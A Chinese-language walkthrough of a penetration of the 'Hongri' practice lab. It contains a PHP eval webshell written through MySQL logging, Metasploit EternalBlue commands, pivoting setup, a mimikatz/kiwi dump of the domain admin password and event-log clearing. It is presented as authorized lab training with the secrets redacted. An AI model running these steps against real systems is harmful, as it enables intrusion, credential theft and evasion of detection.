红日靶场实战复盘

记录一下外网突破到内网横向，还有最后拿到域管密码的全过程。
记录一下本地靶场红日（hongri1）的实战过程。出于隐私，真实 IP、账号密码、Hash 这些全都藏起来了。本地靶场练手，千万别拿去搞没授权的系统，不然真会踩缝纫机。

一、外网打点与信息收集

启动靶机后，获取到外网 IP <靶机外网IP>。在 Kali 上添加路由打通网络，随后进行端口扫描。

# 添加路由，确保 Kali 能连通靶机
sudo ip route add <靶机网段> via <路由器IP> dev eth0
# 测试连通性
ping <靶机外网IP> # 回显 64 bytes from ... 0% packet loss

端口扫描结果

nmap -sS -sV -T4 <靶机外网IP>
回显关键信息：
80/tcp open http Apache httpd 2.4.39 (Win64)
3306/tcp open mysql MySQL (unauthorized)
445/tcp open microsoft-ds Windows 7 - 10

访问 80 端口，发现是 phpStudy 探针 2014 页面，泄露了绝对路径 C:/phpstudy_pro/WWW/index.php。目录扫描发现 /phpMyAdmin/ 路径。

二、获取 WebShell（phpMyAdmin 弱口令与日志写马）

访问 http://<靶机外网IP>/phpMyAdmin/，尝试弱口令 root / root，成功登录后台。

1. 尝试 OUTFILE 写马（失败）

SELECT '<?php @eval($_POST["cmd"]); ?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/shell.php'; # 报错：#1290 - The MySQL server is running with the --secure-file-priv option...

2. 改用 MySQL 日志包含写马（成功）

SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'C:/phpstudy_pro/WWW/shell.php';
SELECT '<?php @eval($_POST["cmd"]); ?>';
SET GLOBAL general_log = 'OFF';

3. 验证后门

浏览器访问 http://<靶机外网IP>/shell.php?c=whoami。

回显： 大量数据库日志乱码中包含 nt authority\system。
结论： 成功获取 WebShell，且直接获得系统最高权限。

三、内网穿透与隧道建立

在 WebShell 中执行 ipconfig，发现双网卡结构：外网 <靶机外网IP>，内网 <内网跳板机IP>。确认跳板机身份。

1. 尝试使用 frpc（失败）

  • 上传 frpc.exe 失败（WebShell 上传限制在 2MB/8MB 左右）。
  • 压缩后上传失败（新建文件被拦截）。
  • 使用 certutil 或 powershell 下载静默失败。
  • 结论： 受限于 WebShell 生命周期，无法维持 frpc.exe 后台常驻，果断放弃。

2. 改用 MSF 建立隧道（成功）

使用 Metasploit 重新拿下外网机器，并用 autoroute 和 socks_proxy 建立隧道。

sudo msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <靶机外网IP>
set LHOST <Kali IP>
run # 回显：Meterpreter session 1 opened

# 在 meterpreter 下添加内网路由
run autoroute -s <内网网段>
# 回显：[+] Added route to <内网网段> via <靶机外网IP>

# 挂起会话并启动代理
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j # 回显：Auxiliary module running as background job

四、内网横向移动

利用 MSF 的自动路由，直接对内网机器 <内网跳板机IP> 发起攻击。

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <内网跳板机IP>
set LHOST <Kali IP>
run # 回显：Meterpreter session 2 opened
getuid # 回显：Server username: NT AUTHORITY\SYSTEM
sysinfo # 回显：Computer: STU1, Domain: GOD

成功拿下内网第一台机器（STU1），并确认其已加入 GOD 域。

五、攻击域控受阻

尝试使用相同漏洞攻击域控 <域控IP>，遭遇全面防守。

  • MS17-010： 提示 The target is not vulnerable（域控已打补丁）。
  • SMB（445）： 执行 dir \\<域控IP>\C$，回显 系统发生 67 错误（端口被封）。
  • WMI（135）： 执行 wmic 命令，回显 RPC 服务器不可用（端口被封）。
  • WinRM（5985）： 执行 winrs 命令，回显 Winrs error: WinRM 客户端无法处理该请求（端口被封）。
  • RDP（3389）： 使用 portfwd 转发并尝试 xfreerdp 登录，回显 ERRCONNECT_CONNECT_CANCELLED（端口被封）。
结论： 域控的防火墙极其严格，SMB、WMI、WinRM、RDP 等常用入站端口全部被封禁，无法从外部直接攻破，放弃强攻，转为内部窃取凭据。

六、核心战果：Mimikatz 内存抓取

既然外部门被封死，直接在内网跳板机（STU1）的内存中提取登录凭据。

# 在 STU1 的 meterpreter 下加载 Kiwi（Mimikatz）
load kiwi # 回显：Success.

# 提取所有凭据
creds_all
回显关键信息：
Username: Administrator
Domain: GOD.ORG
Password: <已脱敏的域管理员明文密码>
战果： 成功从内存中抓取到域管理员（GOD.ORG\Administrator）的明文密码，这在真实渗透中意味着极高价值。

七、清理战场与环境恢复

拿到密码后，执行清理操作，并将网络模式恢复为正常状态。

# 清理目标机器系统日志
clearev
# 退出会话
exit
background
sessions
exit

回到物理机，以管理员身份执行 netsh interface portproxy reset 清理本地网络环境。关闭靶机，将 Kali 虚拟机网络模式由“桥接”改为“NAT模式”，确保能正常访问互联网。
